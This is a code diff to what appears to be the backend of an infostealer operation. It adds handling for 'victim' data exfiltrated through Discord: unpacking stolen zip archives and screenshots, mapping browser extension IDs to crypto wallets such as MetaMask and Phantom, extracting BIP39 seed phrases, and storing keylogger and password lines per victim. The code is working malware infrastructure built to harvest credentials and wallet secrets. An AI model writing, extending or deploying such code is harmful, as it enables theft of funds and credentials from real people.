@@ -1,7 +1,8 @@
 import { createDecipheriv, createHash, randomUUID } from 'node:crypto';
+import AdmZip from 'adm-zip';
 import { createReadStream, createWriteStream } from 'node:fs';
 import { mkdir, open, readFile, rename, stat, writeFile } from 'node:fs/promises';
-import { dirname, join, normalize, sep } from 'node:path';
+import { basename, dirname, join, normalize, sep } from 'node:path';
 import type { Artifact, Upload, Victim } from '@prisma/client';
 import { prisma } from '../lib/db';
 import { env } from '../lib/env';
@@ -148,6 +149,14 @@ export async function processArtifact(artifactId: string): Promise<void> {
   if (claimed.count === 0) return;
   const artifact = await prisma.artifact.findUnique({ where: { id: artifactId } });
   if (!artifact) return;
+  if (artifact.source === 'discord') {
+    try {
+      await processDiscordArtifact(artifact);
+    } catch (error) {
+      await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'failed', error: (error instanceof Error ? error.message : 'discord_failed').slice(0, 500) } });
+    }
+    return;
+  }
   try {
     const fd = await open(artifact.containerPath, 'r');
     try {
@@ -243,6 +252,118 @@ type WalletIndex = {
   }>;
   seeds?: Array<{ path: string; kind: string; value: string; words?: number }>;
 };
+
+async function processDiscordArtifact(artifact: Artifact): Promise<void> {
+  const root = artifactDir(artifact.id);
+  await mkdir(root, { recursive: true });
+  const name = basename(artifact.containerPath).toLowerCase();
+  const manifest: { artifacts: Array<{ id: string; path: string; kind: string; size: number; sha256: string }> } = { artifacts: [] };
+
+  if (name.endsWith('.zip')) {
+    const zip = new AdmZip(artifact.containerPath);
+    let index = 0;
+    for (const entry of zip.getEntries()) {
+      if (entry.isDirectory) continue;
+      const rel = safeRel(entry.entryName);
+      const data = entry.getData();
+      if (data.length > 64 * 1024 * 1024) continue;
+      const dest = join(root, rel);
+      await mkdir(dirname(dest), { recursive: true });
+      await writeFile(dest, data);
+      manifest.artifacts.push({ id: `e${++index}`, path: rel, kind: rel.toLowerCase().endsWith('.json') ? 'json' : 'file', size: data.length, sha256: sha256hex(data) });
+    }
+    await indexHarvest(artifact.victimId, artifact.id, manifest.artifacts.map((item) => item.path), root);
+  } else if (name.endsWith('.png')) {
+    const dest = join(root, 'screenshot.png');
+    await writeFile(dest, await readFile(artifact.containerPath));
+    const data = await readFile(dest);
+    manifest.artifacts.push({ id: 'e1', path: 'screenshot.png', kind: 'screenshot', size: data.length, sha256: sha256hex(data) });
+    await prisma.screenshot.create({ data: { victimId: artifact.victimId, artifactId: artifact.id, ts: new Date() } });
+  } else {
+    const dest = join(root, basename(artifact.containerPath));
+    await writeFile(dest, await readFile(artifact.containerPath));
+    const data = await readFile(dest);
+    manifest.artifacts.push({ id: 'e1', path: basename(dest), kind: 'log', size: data.length, sha256: sha256hex(data) });
+    await indexTextFile(artifact.victimId, dest, name);
+  }
+  await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'ready', manifest: manifest as never, processedAt: new Date(), error: null } });
+  await prisma.event.create({ data: { victimId: artifact.victimId, kind: 'artifact_ready', data: { artifactId: artifact.id, module: artifact.module } } });
+  void publish({ type: 'artifact.ready', victimId: artifact.victimId, at: Date.now(), data: { artifactId: artifact.id } });
+}
+
+const EXT_IDS: Record<string, string> = {
+  nkbihfbeogaeaoehlefnkodbefgpgknn: 'metamask',
+  bfnaelmomeimhlpmgjnjophhpkkoljpa: 'phantom',
+  acmacodkjbdgmoleebolmdjonilkdbch: 'rabby',
+  dmkamcknogkgcdfhhbddcghachkejeap: 'keplr',
+  hnfanknocfeofbddgcijnmhnfnkdnaad: 'coinbase',
+  bhhhlbepdkbapadjdnnojkbgioiodbic: 'solflare',
+  ibnejdfjmmkpcnlpebklmnkoeoihofec: 'tronlink',
+  egjidjbpglichdcondbcbdnbeeppgdph: 'trust',
+  fhbohimaelbohpjbbldcngcnapndodjp: 'binance',
+  ffnbelfdoeiohenkjibnmadjiehjhajb: 'yoroi',
+  lpfcbjknijpeeillifnkikgncikgfhdo: 'nami',
+  hmeobnfnfcmdkdcmlblgagmfpfboieaf: 'xdefi',
+  aflkmfhebedbjioipglgcbcmnbpgliof: 'backpack'
+};
+
+async function indexHarvest(victimId: string, artifactId: string, paths: string[], root: string): Promise<void> {
+  const seen = new Set<string>();
+  for (const path of paths) {
+    const lower = path.toLowerCase();
+    let id = '';
+    let decrypted = false;
+    for (const [ext, target] of Object.entries(EXT_IDS)) {
+      if (lower.includes('/local extension settings/' + ext + '/') || lower.startsWith('wallets/') && lower.includes('/' + ext + '/')) {
+        id = target;
+        decrypted = lower.endsWith('decrypted.json');
+        break;
+      }
+    }
+    if (!id) {
+      if (lower.startsWith('wallets/exodus')) id = 'exodus';
+      else if (lower.includes('electrum/wallets/') && lower.endsWith('.wallet')) id = 'electrum';
+      else if (lower.includes('electrum-ltc/wallets/') && lower.endsWith('.wallet')) id = 'electrum-ltc';
+      else if (lower.includes('wallets/atomic/')) id = 'atomic';
+      else if (lower.includes('wallets/trust')) id = 'trust';
+      else if (lower.includes('ledger')) id = 'ledger';
+    }
+    if (!id) continue;
+    const key = `${victimId}:${id}`;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    const walletPath = `discord:${artifactId}:${id}`;
+    await prisma.wallet.upsert({
+      where: { victimId_path: { victimId, path: walletPath } },
+      update: { artifactId, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest', decryptState: decrypted ? 'done' : 'none' },
+      create: { victimId, artifactId, kind: 'desktop', targetId: id, path: walletPath, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest' }
+    });
+  }
+  for (const path of paths) {
+    if (path.endsWith('findings.txt') || path.includes('findings-')) {
+      await indexTextFile(victimId, join(root, path), path);
+    }
+  }
+}
+
+async function indexTextFile(victimId: string, path: string, name: string): Promise<void> {
+  const text = await readFile(path, 'utf8').catch(() => '');
+  if (!text) return;
+  if (name.includes('seeds') || name.includes('findings')) {
+    for (const line of text.split('\n')) {
+      const seed = /(?:bip39-\d+|seed):\s*([a-z ]{20,})/i.exec(line);
+      const value = seed ? seed[1]!.trim() : (name.includes('seeds') ? line.split('|').pop()?.trim() ?? '' : '');
+      if (!value || value.split(/\s+/).length < 12) continue;
+      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', value, source: 'discord_findings' } } });
+    }
+  }
+  if (name.includes('keys.log') || name.includes('passwords')) {
+    for (const line of text.split('\n').slice(0, 2000)) {
+      if (!line.trim()) continue;
+      await prisma.keylog.create({ data: { victimId, text: line.slice(0, 4000), password: name.includes('passwords') } });
+    }
+  }
+}
 
 async function indexArtifact(artifactId: string, victimId: string, manifest: Manifest, root: string): Promise<void> {
   if (manifest.module === 'wallets') {
